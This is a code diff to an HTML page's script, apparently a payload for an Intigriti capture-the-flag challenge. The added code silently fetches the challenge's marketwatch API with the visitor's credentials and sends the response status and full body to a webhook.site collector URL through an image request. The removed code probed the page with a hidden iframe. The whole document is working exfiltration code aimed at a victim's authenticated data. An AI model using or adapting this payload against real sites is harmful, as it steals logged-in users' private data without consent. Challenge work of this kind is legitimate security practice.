@@ -4,20 +4,28 @@
 <script>
 const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-// Try to load MarketWatch page
-const iframe = document.createElement("iframe");
-iframe.src = "https://challenge-0126.intigriti.io/marketwatch.html";
-iframe.style.display = "none";
+(async () => {
+  try {
+    const res = await fetch(
+      "https://challenge-0126.intigriti.io/api/marketwatch",
+      { credentials: "include" }
+    );
 
-iframe.onload = () => {
-  new Image().src = WEBHOOK + "?stage=marketwatch_page_loaded";
-};
+    const text = await res.text();
 
-iframe.onerror = () => {
-  new Image().src = WEBHOOK + "?stage=marketwatch_page_error";
-};
+    new Image().src =
+      WEBHOOK +
+      "?stage=marketwatch_api_response" +
+      "&status=" + res.status +
+      "&body=" + encodeURIComponent(text);
 
-document.body.appendChild(iframe);
+  } catch (e) {
+    new Image().src =
+      WEBHOOK +
+      "?stage=marketwatch_api_error&msg=" +
+      encodeURIComponent(e.toString());
+  }
+})();
 </script>
 </body>
 </html>
